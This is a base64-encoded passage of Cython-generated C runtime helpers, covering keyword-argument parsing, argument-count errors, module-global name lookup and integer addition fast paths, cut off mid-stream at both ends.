c3NpemVfdCBsZW47CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IGRlZmluZWQoUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKQogICAgaWYgKHVubGlrZWx5KCFQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMoa3dkcykpKSByZXR1cm4gLTE7CiNlbmRpZgogICAgaWYgKFB5RGljdF9VcGRhdGUoa3dkczIsIGt3ZHMpIDwgMCkgZ290byBiYWQ7CiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgd2hpbGUgKCpuYW1lKSB7CiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTsKICAgICAgICBQeU9iamVjdCAqdmFsdWU7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBMiB8fCBkZWZpbmVkKFB5RGljdF9Qb3ApKQogICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9Qb3Aoa3dkczIsIGtleSwgJnZhbHVlKTsKICAgICAgICBpZiAoZm91bmQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICB9CiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMyLCBrZXksICZ2YWx1ZSk7CiAgICAgICAgaWYgKGZvdW5kKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShmb3VuZCA8IDApKSBnb3RvIGJhZDsKICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfRGVsSXRlbShrd2RzMiwga2V5KSA8IDApKSBnb3RvIGJhZDsKICAgICAgICB9CiNlbHNlCiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgdmFsdWUgPSBfUHlEaWN0X1BvcChrd2RzMiwga2V5LCBrd2RzMik7CiAgICAjZWxzZQogICAgICAgIHZhbHVlID0gX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMigmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AsIGt3ZHMyLCBrZXksIGt3ZHMyKTsKICAgICNlbmRpZgogICAgICAgIGlmICh2YWx1ZSA9PSBrd2RzMikgewogICAgICAgICAgICBQeV9ERUNSRUYodmFsdWUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGJhZDsKICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7CiAgICAgICAgfQojZW5kaWYKICAgICAgICBuYW1lKys7CiAgICB9CiAgICBsZW4gPSBQeURpY3RfU2l6ZShrd2RzMik7CiAgICBpZiAobGVuID4gMCkgewogICAgICAgIHJldHVybiBfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGxlbiA9PSAtMSkpIHsKICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIHJldHVybiAwOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0Kc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmRzVHVwbGUoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSwKICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpCnsKICAgIFB5T2JqZWN0ICprZXkgPSBOVUxMOwogICAgUHlPYmplY3QqKiBjb25zdCAqIG5hbWU7CiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJnczsKICAgIGZvciAoUHlfc3NpemVfdCBwb3MgPSAwOyBwb3MgPCBudW1fa3dhcmdzOyBwb3MrKykgewojaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBrZXkgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oa3dkcywgcG9zKTsKI2Vsc2UKICAgICAgICBrZXkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3ZHMsIHBvcyk7CiNlbmRpZgojaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIGdvdG8gYmFkOwojZW5kaWYKICAgICAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKzsKICAgICAgICBpZiAoKm5hbWUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnZhbHVlID0ga3d2YWx1ZXNbcG9zXTsKICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gX19QeXhfTmV3UmVmKHZhbHVlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwOwogICAgICAgICAgICBpbnQgY21wID0gX19QeXhfTWF0Y2hLZXl3b3JkQXJnKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgJmluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTsKICAgICAgICAgICAgaWYgKGNtcCA9PSAxKSB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdOwogICAgICAgICAgICAgICAgdmFsdWVzW2luZGV4X2ZvdW5kXSA9IF9fUHl4X05ld1JlZih2YWx1ZSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7CiAgICAgICAgICAgICAgICBpZiAoa3dkczIpIHsKICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShrd2RzMiwga2V5LCB2YWx1ZSkpKSBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoIWlnbm9yZV91bmtub3duX2t3YXJncykgewogICAgICAgICAgICAgICAgICAgIGdvdG8gaW52YWxpZF9rZXl3b3JkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgIGtleSA9IE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICB9CiAgICByZXR1cm4gMDsKaW52YWxpZF9rZXl3b3JkOgogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50ICclVSciLAogICAgICAgIGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICBnb3RvIGJhZDsKYmFkOgogICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBQeV9YREVDUkVGKGtleSk7CiAgICAjZW5kaWYKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSwKICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpCnsKICAgIGlmIChDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiBsaWtlbHkoUHlUdXBsZV9DaGVjayhrd2RzKSkpCiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZHNUdXBsZShrd2RzLCBrd3ZhbHVlcywgYXJnbmFtZXMsIGt3ZHMyLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTsKICAgIGVsc2UgaWYgKGt3ZHMyKQogICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KGt3ZHMsIGFyZ25hbWVzLCBrd2RzMiwgdmFsdWVzLCBudW1fcG9zX2FyZ3MsIGZ1bmN0aW9uX25hbWUpOwogICAgZWxzZQogICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0KGt3ZHMsIGFyZ25hbWVzLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTsKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKAogICAgY29uc3QgY2hhciogZnVuY19uYW1lLAogICAgaW50IGV4YWN0LAogICAgUHlfc3NpemVfdCBudW1fbWluLAogICAgUHlfc3NpemVfdCBudW1fbWF4LAogICAgUHlfc3NpemVfdCBudW1fZm91bmQpCnsKICAgIFB5X3NzaXplX3QgbnVtX2V4cGVjdGVkOwogICAgY29uc3QgY2hhciAqbW9yZV9vcl9sZXNzOwogICAgaWYgKG51bV9mb3VuZCA8IG51bV9taW4pIHsKICAgICAgICBudW1fZXhwZWN0ZWQgPSBudW1fbWluOwogICAgICAgIG1vcmVfb3JfbGVzcyA9ICJhdCBsZWFzdCI7CiAgICB9IGVsc2UgewogICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9tYXg7CiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IG1vc3QiOwogICAgfQogICAgaWYgKGV4YWN0KSB7CiAgICAgICAgbW9yZV9vcl9sZXNzID0gImV4YWN0bHkiOwogICAgfQogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAiJS4yMDBzKCkgdGFrZXMgJS44cyAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgcG9zaXRpb25hbCBhcmd1bWVudCUuMXMgKCUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBnaXZlbikiLAogICAgICAgICAgICAgICAgIGZ1bmNfbmFtZSwgbW9yZV9vcl9sZXNzLCBudW1fZXhwZWN0ZWQsCiAgICAgICAgICAgICAgICAgKG51bV9leHBlY3RlZCA9PSAxKSA/ICIiIDogInMiLCBudW1fZm91bmQpOwp9CgoKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lLCBQeU9iamVjdCogdmFsdWUpIHsKICAgIFB5VHlwZU9iamVjdCogdHAgPSBQeV9UWVBFKG9iaik7CiAgICBpZiAobGlrZWx5KHRwLT50cF9zZXRhdHRybykpCiAgICAgICAgcmV0dXJuIHRwLT50cF9zZXRhdHRybyhvYmosIGF0dHJfbmFtZSwgdmFsdWUpOwogICAgcmV0dXJuIFB5T2JqZWN0X1NldEF0dHIob2JqLCBhdHRyX25hbWUsIHZhbHVlKTsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0OwogICAgcmV0dXJuIGxpa2VseShkaWN0KSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgOiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICoqZGljdHB0ciA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdG9mZnNldDsKICAgIGlmIChvZmZzZXQpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGRpY3RwdHIgPSAobGlrZWx5KG9mZnNldCA+IDApKSA/IChQeU9iamVjdCAqKikgKChjaGFyICopb2JqICsgb2Zmc2V0KSA6IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbHNlCiAgICAgICAgZGljdHB0ciA9IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbmRpZgogICAgfQogICAgcmV0dXJuIChkaWN0cHRyICYmICpkaWN0cHRyKSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oKmRpY3RwdHIpIDogMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbikgewogICAgUHlPYmplY3QgKmRpY3QgPSBQeV9UWVBFKG9iaiktPnRwX2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIWRpY3QpIHx8IHVubGlrZWx5KHRwX2RpY3RfdmVyc2lvbiAhPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpKSkKICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiBvYmpfZGljdF92ZXJzaW9uID09IF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKG9iaik7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKQojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpCiNlbmRpZgp7CiAgICBQeU9iamVjdCAqcmVzdWx0OwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tKSkgewogICAgICAgIGlmICghUHlFcnJfT2NjdXJyZWQoKSkKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19OYW1lRXJyb3IpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0QXR0cihfX3B5eF9tLCBuYW1lKTsKICAgIGlmIChsaWtlbHkocmVzdWx0KSkgewogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgbmFtZSwgJnJlc3VsdCkgPT0gLTEpKSBQeUVycl9DbGVhcigpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxzZQogICAgcmVzdWx0ID0gX1B5RGljdF9HZXRJdGVtX0tub3duSGFzaChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBuYW1lLCAoKFB5QVNDSUlPYmplY3QgKikgbmFtZSktPmhhc2gpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZW5kaWYKICAgIHJldHVybiBfX1B5eF9HZXRCdWlsdGluTmFtZShuYW1lKTsKfQoKCiNpZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lLCBpbnQgd2l0aF9lcnJvcikgewogICAgUHlPYmplY3QgKnJlczsKICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7CiAgICByZXMgPSBfUHlUeXBlX0xvb2t1cCh0cCwgYXR0cl9uYW1lKTsKICAgIGlmIChsaWtlbHkocmVzKSkgewogICAgICAgIGRlc2NyZ2V0ZnVuYyBmID0gUHlfVFlQRShyZXMpLT50cF9kZXNjcl9nZXQ7CiAgICAgICAgaWYgKCFmKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihyZXMpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJlcyA9IGYocmVzLCBvYmosIChQeU9iamVjdCAqKXRwKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKHdpdGhfZXJyb3IpIHsKICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfQXR0cmlidXRlRXJyb3IsIGF0dHJfbmFtZSk7CiAgICB9CiAgICByZXR1cm4gcmVzOwp9CiNlbmRpZgoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCnN0YXRpYyBQeU9iamVjdCogX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgaW50IGlucGxhY2UpIHsKICAgIHJldHVybiAoaW5wbGFjZSA/IFB5TnVtYmVyX0luUGxhY2VBZGQgOiBQeU51bWJlcl9BZGQpKG9wMSwgb3AyKTsKfQojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCnN0YXRpYyBQeU9iamVjdCogX19QeXhfVW5wYWNrZWRfX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnBsYWNlKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7CiAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7CiAgICBsb25nIGEsIHg7CiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgY29uc3QgUFlfTE9OR19MT05HIGxsYiA9IGludHZhbDsKICAgIFBZX0xPTkdfTE9ORyBsbGEsIGxseDsKI2VuZGlmCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzWmVybyhvcDEpKSkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AyKTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcob3AxLCAmYSkpKSB7CiAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMob3AxKTsKICAgICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChvcDEpOwogICAgICAgIHN3aXRjaCAoc2l6ZSkgewogICAgICAgICAgICBjYXNlIC0yOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgLTQ6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1